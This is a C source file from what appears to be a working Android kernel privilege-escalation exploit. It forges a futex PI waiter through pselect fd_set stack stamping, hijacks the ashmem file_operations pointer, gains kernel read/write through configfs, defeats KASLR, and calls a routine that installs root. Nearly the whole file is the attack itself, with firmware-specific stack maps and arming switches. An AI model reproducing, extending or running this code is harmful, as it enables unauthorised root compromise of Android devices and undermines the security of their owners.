#include "common.h"

#ifndef PSELECT_CFI_ROUTE_ATTEMPTS
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define PSELECT_CFI_ROUTE_ATTEMPTS 4
#else
#define PSELECT_CFI_ROUTE_ATTEMPTS 1
#endif
#endif

atomic_int cfi_stage_done;
atomic_int cfi_safe_hold_required;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

static int route_delay_usec(int attempt) {
  const char *forced = getenv("PSELECT_DELAY_USEC");
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 0 && value <= 1000000) {
#if defined(APP_PAYLOAD) && APP_PAYLOAD
      static const int offsets[] = {0, 5000, 0, 5000};
      size_t index = (size_t)(attempt - 1) %
                     (sizeof(offsets) / sizeof(offsets[0]));
      return (int)value + offsets[index];
#else
      return (int)value;
#endif
    }
  }
  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };

  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}

#ifndef SLIDE_PSELECT_WORD_SHIFT
#define SLIDE_PSELECT_WORD_SHIFT 0
#endif

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

static int pselect_words_per_set(void) {
  return (PSELECT_ROUTE_NFDS + 63) / 64;
}

static int pselect_put_global_word(fd_set *in, fd_set *out, fd_set *ex,
                                   int global_word, uint64_t value) {
  int words_per_set = pselect_words_per_set();
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

static int pselect_put_waiter_word(fd_set *in, fd_set *out, fd_set *ex,
                                   int waiter_word, uint64_t value,
                                   const char *name) {
  int global_word = SLIDE_PSELECT_WORD_SHIFT + waiter_word;
  if (!pselect_put_global_word(in, out, ex, global_word, value)) {
    pr_warning("pselect cannot place %s waiter_word=%d global=%d wps=%d\n",
               name, waiter_word, global_word, pselect_words_per_set());
    return 0;
  }
  return 1;
}

static int pselect_fd_is_selected(
    int fd, fd_set *in, fd_set *out, fd_set *ex) {
  return FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex);
}

static int pselect_blocking_fd_mode(void) {
#if defined(FOPS_PSELECT_BLOCKING_FDS) && FOPS_PSELECT_BLOCKING_FDS
  return 1;
#else
  const char *mode = getenv("RMG_PSELECT_FD_MODE");
  return mode && strcmp(mode, "block") == 0;
#endif
}

static int pselect_peer_keepalive = -1;

static void close_pselect_peer_keepalive(void) {
  if (pselect_peer_keepalive >= 0) {
    close(pselect_peer_keepalive);
    pselect_peer_keepalive = -1;
  }
}

/*
 * Every bit planted in the three fd_sets must name a valid descriptor.
 * r18 stopped after 128 dup2 calls, which made pselect deterministically fail
 * with EBADF.  Keep log descriptors above 512 and populate every selected fd.
 *
 * RMG_PSELECT_FD_MODE=block selects the pipe read end (not-ready); the default
 * preserves the upstream write-end behavior for comparison.
 */
void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  int block_mode = pselect_blocking_fd_mode();
  int source_fd = block_mode ? read_fd : write_fd;
  int peer_fd = block_mode ? write_fd : read_fd;
  close_pselect_peer_keepalive();
  pselect_peer_keepalive = fcntl(
      peer_fd, F_DUPFD_CLOEXEC, PSELECT_ROUTE_NFDS + 96);
  if (pselect_peer_keepalive < 0) {
    pr_warning("pselect peer keepalive mode=%s errno=%d\n",
               block_mode ? "block" : "write", errno);
    return;
  }
  int high_source = fcntl(source_fd, F_DUPFD_CLOEXEC,
                          PSELECT_ROUTE_NFDS + 32);
  if (high_source < 0) {
    pr_warning("pselect F_DUPFD mode=%s errno=%d\n",
               block_mode ? "block" : "write", errno);
    close_pselect_peer_keepalive();
    return;
  }
  int opened = 0;
  int failed = 0;
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (pselect_fd_is_selected(fd, in, out, ex)) {
      if (dup3(high_source, fd, O_CLOEXEC) >= 0) {
        opened++;
      } else {
        failed++;
      }
    }
  }
  pr_info("pselect open_selected_fds mode=%s opened=%d failed=%d "
          "high_source=%d peer_keepalive=%d\n",
          block_mode ? "block" : "write", opened, failed, high_source,
          pselect_peer_keepalive);
  fflush(NULL);
  close(high_source);
}

static int validate_selected_fds(fd_set *in, fd_set *out, fd_set *ex) {
  int selected = 0;
  int invalid = 0;
  int first_invalid = -1;
  int first_selected = -1;

  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (!pselect_fd_is_selected(fd, in, out, ex)) {
      continue;
    }
    selected++;
    if (first_selected < 0) {
      first_selected = fd;
    }
    if (fcntl(fd, F_GETFD) < 0) {
      if (first_invalid < 0) {
        first_invalid = fd;
      }
      invalid++;
    }
  }

  struct pollfd probe = {
    .fd = first_selected,
    .events = POLLIN | POLLOUT | POLLPRI,
    .revents = 0,
  };
  errno = 0;
  int poll_ret = first_selected >= 0 ? poll(&probe, 1, 0) : -1;
  int poll_errno = errno;
  int unexpectedly_ready =
      pselect_blocking_fd_mode() &&
      (poll_ret != 0 || probe.revents != 0);

  pr_info("pselect fd validation selected=%d invalid=%d first_invalid=%d "
          "probe_fd=%d poll_ret=%d revents=0x%x poll_errno=%d ready=%d\n",
          selected, invalid, first_invalid, first_selected, poll_ret,
          probe.revents, poll_errno, unexpectedly_ready);
  fflush(NULL);
  return invalid == 0 && !unexpectedly_ready;
}

/*
 * Preserve the upstream standalone FOPS residual-stack stamp.  The waiter
 * object was already constructed by FUTEX_WAIT_REQUEUE_PI; pselect only
 * overwrites the qwords used by the fake-lock route.  r13-r19 incorrectly
 * copied the reclaimed-page waiter image into the fd-set sequence, which is a
 * different object with different invariants.
 */
void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

#if defined(FOPS_PSELECT_FULL_WAITER_STAMP) && \
    FOPS_PSELECT_FULL_WAITER_STAMP
  /*
   * A256EXXUCEZE6 r21 gave us an exact saved-stack map:
   *
   *   logical fd-set word 0 == stale waiter - 0x30
   *   logical fd-set word 6 == stale waiter + 0x00
   *
   * Stamp every live legacy-waiter qword through prio.  Deadline is waiter
   * word 9/global word 15, just beyond the 3 * 5 copied words; the same dump
   * proves that stale waiter + 0x48 is already zero.
   */
  struct pselect_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  } words[] = {
    {0, 1, "tree_parent"},
    {1, 0, "tree_right"},
    {2, 0, "tree_left"},
    {3, fake_fops, "pi_parent"},
    {4, data_addr(ASHMEM_MISC_FOPS), "pi_right"},
    {5, 0, "pi_left"},
    {6, text_addr(INIT_TASK), "task"},
    {7, fake_lock, "lock"},
    {8, FOPS_FAKE_WAITER_PRIO, "prio"},
  };

  int placed = 0;
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    placed += pselect_put_waiter_word(in, out, ex, words[i].word,
                                      words[i].value, words[i].name);
  }

  pr_info("pselect fdsets planted mode=full-waiter shift=%d wps=%d "
          "placed=%d task=%016zx lock=%016zx pi_parent=%016zx "
          "pi_right=%016zx prio=%d deadline=residual-zero\n",
          SLIDE_PSELECT_WORD_SHIFT, pselect_words_per_set(), placed,
          text_addr(INIT_TASK), fake_lock, fake_fops,
          data_addr(ASHMEM_MISC_FOPS), FOPS_FAKE_WAITER_PRIO);
#else
  fdset_put_word(in, 0, fake_w0);
  fdset_put_word(in, 1, 0);
  fdset_put_word(in, 2, 0);
  fdset_put_word(in, 3, 0);
  fdset_put_word(ex, 0, text_addr(INIT_TASK));
  fdset_put_word(ex, 1, fake_lock);
  fdset_put_word(ex, 2, SLIDE_WAITER_WAKE_STATE);
  fdset_put_word(ex, 3, 0);

  pr_info("pselect fdsets planted mode=residual shift=%d wps=%d "
          "fake_w0=%016zx init_task=%016zx lock=%016zx wake=%d\n",
          SLIDE_PSELECT_WORD_SHIFT, pselect_words_per_set(), fake_w0,
          text_addr(INIT_TASK), fake_lock, SLIDE_WAITER_WAKE_STATE);
#endif
  fflush(NULL);
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_warning("pselect route missing kernel page base=%016zx lock=%016zx "
               "fops=%016zx; unwinding PI route\n",
               page_base, fake_lock, fake_fops);
    return;
  }

  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_warning("pselect retry page prepare failed attempt=%d base=%016zx "
                   "lock=%016zx fops=%016zx; unwinding PI route\n",
                   route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    int pipefd[2] = {-1, -1};
    if (pipe(pipefd) != 0) {
      cfi_last_step = 35;
      cfi_last_errno = errno;
      pr_warning("pselect route pipe setup failed attempt=%d errno=%d; "
                 "unwinding PI route\n",
                 route_attempt, errno);
      break;
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    pr_info("pselect preparing fdsets attempt=%d\n", route_attempt);
    fflush(NULL);
    prepare_pselect_fdsets(&in, &out, &ex);
    pr_info("pselect opening selected fds attempt=%d\n", route_attempt);
    fflush(NULL);
    open_selected_fds(&in, &out, &ex, pipefd[0], pipefd[1]);
    int fds_valid = validate_selected_fds(&in, &out, &ex);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&consumer_seen_seq, 0);
    atomic_store(&consumer_wake_ret, -99);
    atomic_store(&consumer_wake_errno, 0);
    atomic_store(&consumer_last_errno, 0);
    atomic_store(&consumer_last_ret, 0);
    atomic_store(&consumer_last_tid, 0);
    atomic_store(&consumer_last_nice, -1);
    atomic_store(&consumer_nice_before, -99);
    atomic_store(&consumer_nice_after, -99);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);

    struct timespec timeout = {
      .tv_sec = 0,
      .tv_nsec = 500000000L, /* 500ms — enough for spinning consumer */
    };
    struct timespec *timeoutp = &timeout;

    pr_info("pselect about_to_enter attempt=%d nfds=%d fds_valid=%d delay=%d "
            "init_task=%016zx fake_w0=%016zx ashmem_misc=%016zx "
            "phys=%016llx load=%016llx\n",
            route_attempt, PSELECT_ROUTE_NFDS, fds_valid, delay_usec,
            text_addr(INIT_TASK), fake_w0, data_addr(ASHMEM_MISC_FOPS),
            (unsigned long long)P0_PHYS_OFFSET,
            (unsigned long long)P0_KERNEL_PHYS_LOAD);
    fflush(NULL);

    if (getenv("RMG_STOP_BEFORE_PSELECT") &&
        strcmp(getenv("RMG_STOP_BEFORE_PSELECT"), "0") != 0) {
      pr_success("RMG_STOP_BEFORE_PSELECT set — not calling pselect()\n");
      fflush(NULL);
      atomic_store(&punch_consume_go, 0);
      close_pselect_peer_keepalive();
      close(pipefd[0]);
      close(pipefd[1]);
      return;
    }

#if !defined(FOPS_PSELECT_TRIGGER_ARMED) || !FOPS_PSELECT_TRIGGER_ARMED
    const char *allow_pselect = getenv("RMG_ALLOW_PSELECT_TRIGGER");
    if (!allow_pselect || strcmp(allow_pselect, "1") != 0) {
      pr_warning("pselect trigger is not armed; set "
                 "RMG_ALLOW_PSELECT_TRIGGER=1 explicitly\n");
      close_pselect_peer_keepalive();
      close(pipefd[0]);
      close(pipefd[1]);
      return;
    }
#endif

    if (!fds_valid) {
      pr_warning("pselect trigger refused: fd readiness validation failed\n");
      close_pselect_peer_keepalive();
      close(pipefd[0]);
      close(pipefd[1]);
      return;
    }

    struct timespec pselect_started;
    struct timespec pselect_finished;
    if (clock_gettime(CLOCK_MONOTONIC, &pselect_started) != 0) {
      cfi_last_step = 36;
      cfi_last_errno = errno;
      pr_warning("pselect start clock failed attempt=%d errno=%d; "
                 "unwinding PI route\n",
                 route_attempt, errno);
      close_pselect_peer_keepalive();
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }
    atomic_store(&punch_consume_go, route_attempt);
    errno = 0;
    long wake_ret = futex_op((uint32_t *)&punch_consume_go,
                             FUTEX_WAKE_PRIVATE, 1, NULL, NULL, 0);
    atomic_store(&consumer_wake_ret, (int)wake_ret);
    atomic_store(&consumer_wake_errno, errno);
    errno = 0;
    int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, timeoutp, NULL);
    int saved_errno = errno;
    if (clock_gettime(CLOCK_MONOTONIC, &pselect_finished) != 0) {
      pselect_finished = pselect_started;
      pr_warning("pselect finish clock failed attempt=%d errno=%d; "
                 "continuing with elapsed_us=0\n",
                 route_attempt, errno);
    }
    atomic_store(&punch_consume_go, 0);
    int consumer_settle_usec = 0;
    while (atomic_load(&consumer_seen_seq) == route_attempt &&
           atomic_load(&consumer_calls) == 0 &&
           consumer_settle_usec < PSELECT_CONSUMER_SETTLE_USEC) {
      usleep(1000);
      consumer_settle_usec += 1000;
    }
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    int consumer_ret = atomic_load(&consumer_last_ret);
    int consumer_errno = atomic_load(&consumer_last_errno);
    int consumer_tid = atomic_load(&consumer_last_tid);
    int consumer_nice = atomic_load(&consumer_last_nice);
    int seen_seq = atomic_load(&consumer_seen_seq);
    long long elapsed_usec =
        (long long)(pselect_finished.tv_sec - pselect_started.tv_sec) *
            1000000LL +
        (long long)(pselect_finished.tv_nsec - pselect_started.tv_nsec) /
            1000LL;
    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d "
            "consumer_ret=%d consumer_errno=%d consumer_tid=%d nice=%d "
            "nice_before=%d nice_after=%d forged_prio=%d "
            "seen=%d wake=%d/%d requeue=%d/%d wait=%d/%d "
            "elapsed_us=%lld settle_us=%d\n",
            route_attempt, ret, saved_errno, calls, success, consumer_ret,
            consumer_errno, consumer_tid, consumer_nice,
            atomic_load(&consumer_nice_before),
            atomic_load(&consumer_nice_after), FOPS_FAKE_WAITER_PRIO, seen_seq,
            atomic_load(&consumer_wake_ret),
            atomic_load(&consumer_wake_errno),
            atomic_load(&main_requeue_ret),
            atomic_load(&main_requeue_errno),
            atomic_load(&waiter_wait_ret),
            atomic_load(&waiter_wait_errno), elapsed_usec,
            consumer_settle_usec);

    int route_signal = calls > 0 && success > 0;
    if (route_signal) {
      if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    close(pipefd[0]);
    close(pipefd[1]);
    close_pselect_peer_keepalive();

    if (route_verified || cfi_dirty_seen) {
      break;
    }
    pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_step,
            cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data_ptr =
      SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data_ptr, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data_ptr, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data_ptr, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  int boot_id_restored =
      slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
      slide_bootid_after == slide_bootid_want;

#ifdef SLIDE_RB_PARENT_TYPE_RESTORE
  uintptr_t parent_type = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset +
                          sizeof(uint64_t);
  uint64_t type_before = 0;
  uint64_t type_after = 0;
  uint64_t type_want = SLIDE_RB_PARENT_TYPE_RESTORE;
  configfs_read_once(fd, parent_type, &type_before, sizeof(type_before));
  ssize_t type_restore_ret =
      configfs_write_once(fd, parent_type, &type_want, sizeof(type_want));
  configfs_read_once(fd, parent_type, &type_after, sizeof(type_after));
  pr_info("slide restore rb parent type pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), type_restore_ret,
          (unsigned long long)type_before,
          (unsigned long long)type_want,
          (unsigned long long)type_after, errno);
  return boot_id_restored &&
         type_restore_ret == (ssize_t)sizeof(type_want) &&
         type_after == type_want;
#else
  return boot_id_restored;
#endif
}

int install_child_root(int fd) {
  int physrw_installed = install_pipe_physrw(fd);
  int root_installed = physrw_installed && install_android_root(fd);
  int cache_restored = restore_pipe_usercopy_cache(fd);
  if (!cache_restored) {
    mark_exploit_safety(EXPLOIT_SAFETY_HOLD);
    pr_warning("pipe usercopy cache restore failed; refusing pipe teardown\n");
    fflush(NULL);
    for (;;) {
      sleep(60);
    }
  }
  return root_installed;
}

int try_cfi_stage(void) {
  cfi_attempts++;
  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
  int fd = open_ashmem_device();
  int dirty = 0;
  int fops_hijacked = 0;
  ssize_t restore = -1;
  uint64_t original_fops = canon_addr(ASHMEM_FOPS);

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    return 0;
  }

  /*
   * A successful sched_setattr only starts the PI operation; it does not prove
   * that ashmem_misc.fops was actually replaced. Probe the captured fd before
   * assuming it owns the fake table. The aligned direct-map address is known
   * mapped, position zero avoids configfs read bounds, and no data is changed.
   * Real ashmem has no .read callback and cannot return all eight bytes.
   */
  uintptr_t probe_target = page_base & ~(uintptr_t)0xffffffULL;
  uint64_t probe_value = 0;
  errno = 0;
  ssize_t probe_ret = configfs_read_once(
      fd, probe_target, &probe_value, sizeof(probe_value));
  int probe_errno = errno;
  pr_info("cfi captured-fops probe fd=%d target=%016zx pos=0 "
          "ret=%zd value=%016llx errno=%d\n",
          fd, probe_target, probe_ret,
          (unsigned long long)probe_value, probe_errno);
  fflush(NULL);
  if (probe_ret != (ssize_t)sizeof(probe_value)) {
    cfi_last_step = 4;
    cfi_last_errno = probe_errno;
    pr_warning("cfi route miss: fd retained real ashmem fops; "
               "unwinding PI chain without global restoration\n");
    if (close(fd) != 0) {
      pr_warning("cfi clean-miss fd close failed fd=%d errno=%d\n", fd, errno);
    }
    return 0;
  }
  fops_hijacked = 1;
  /*
   * misc_open copied the fake table into this file, so this fd keeps the
   * configfs primitives after the global pointer is repaired.  Restore the
   * global as the very first operation after open: if any later diagnostic
   * fails or this process exits, unrelated ashmem users must never inherit a
   * reclaimed fake-fops page.
   */
  restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  int restore_errno = errno;
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = restore_errno;
    pr_warning("cfi early restore write failed ret=%zd errno=%d; "
               "entering verified emergency restore\n",
               restore, restore_errno);
    goto fail;
  }

  uint64_t restored_fops = 0;
  ssize_t restored_rb = configfs_read_once(
      fd, misc_fops, &restored_fops, sizeof(restored_fops));
  fops_before = restored_fops;
  fops_after = restored_fops;
  pr_info("cfi stage begin attempt=%d fake_fops=%016zx misc_fops=%016zx\n",
          cfi_attempts, fake_fops, misc_fops);
  pr_info("cfi ashmem opened fd=%d path=%s\n", fd, ashmem_path);
#if defined(CONFIGFS_ASHMEM_LOW24_POSITION) && \
    CONFIGFS_ASHMEM_LOW24_POSITION
  pr_info("cfi restore low24 base=%016zx pos=%08zx\n",
          misc_fops & ~(uintptr_t)0xffffffULL,
          misc_fops & (uintptr_t)0xffffffULL);
#endif
  pr_info("cfi early restore misc_fops target=%016zx value=%016llx "
          "write=%zd\n",
          misc_fops, (unsigned long long)original_fops, restore);
  pr_info("cfi early restore readback ret=%zd value=%016llx want=%016llx "
          "errno=%d\n",
          restored_rb, (unsigned long long)restored_fops,
          (unsigned long long)original_fops, errno);
  fflush(NULL);
  if (restored_rb != (ssize_t)sizeof(restored_fops) ||
      restored_fops != original_fops) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }
  fops_hijacked = 0;

  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
#if defined(CONFIGFS_ASHMEM_LOW24_POSITION) && \
    CONFIGFS_ASHMEM_LOW24_POSITION
  pr_info("cfi write low24 target=%016zx base=%016zx pos=%08zx size=%zu\n",
          binwrite_target, binwrite_target & ~(uintptr_t)0xffffffULL,
          binwrite_target & (uintptr_t)0xffffffULL,
          (binwrite_target & (uintptr_t)0xffffffULL) + sizeof(payload));
#endif
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);
  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  if (!restore_p0_oracle_pages(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }
#endif

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  if (rb != (ssize_t)sizeof(before) || before != original_fops) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
  if (!restore_slide_boot_id(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }
#endif

  if (!kaslr_done) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

  pr_info("cfi starting pipe physrw\n");

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  if (getenv("P0_ORACLE_DIAG")) {
    int diagnostic_ok = run_p0_pipe_oracle_diagnostic(fd);
    fflush(NULL);
    _exit(diagnostic_ok ? 0 : 1);
  }
#endif

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  if (close(fd) != 0) {
    pr_warning("cfi success fd close failed fd=%d errno=%d; "
               "root remains installed\n",
               fd, errno);
  }
  if (owner == (ssize_t)sizeof(null_owner) &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  if (fops_hijacked) {
    for (int restore_attempt = 1; restore_attempt <= 3; restore_attempt++) {
      uint64_t after_fail = 0;
      cfi_restore_ret = configfs_write_once(
          fd, misc_fops, &original_fops, sizeof(original_fops));
      int fail_write_errno = errno;
      ssize_t fail_rb = configfs_read_once(
          fd, misc_fops, &after_fail, sizeof(after_fail));
      int fail_read_errno = errno;
      fops_after = after_fail;
      pr_warning("cfi emergency restore attempt=%d/3 write=%zd/%d "
                 "read=%zd/%d after=%016llx want=%016llx\n",
                 restore_attempt, cfi_restore_ret, fail_write_errno,
                 fail_rb, fail_read_errno,
                 (unsigned long long)after_fail,
                 (unsigned long long)original_fops);
      if (cfi_restore_ret == (ssize_t)sizeof(original_fops) &&
          fail_rb == (ssize_t)sizeof(after_fail) &&
          after_fail == original_fops) {
        fops_hijacked = 0;
        break;
      }
    }
  }
  if (dirty) {
    uint64_t null_owner_fail = 0;
    cfi_owner_ret = configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
  }
  if (fops_hijacked) {
    atomic_store(&cfi_safe_hold_required, 1);
    mark_exploit_safety(EXPLOIT_SAFETY_HOLD);
    pr_warning("cfi emergency restore remains unverified; deferring "
               "stable-page hold until after PI-chain cleanup\n");
    fflush(NULL);
    return 0;
  }
  if (close(fd) != 0) {
    pr_warning("cfi failure fd close failed fd=%d errno=%d\n", fd, errno);
  }
  return 0;
}
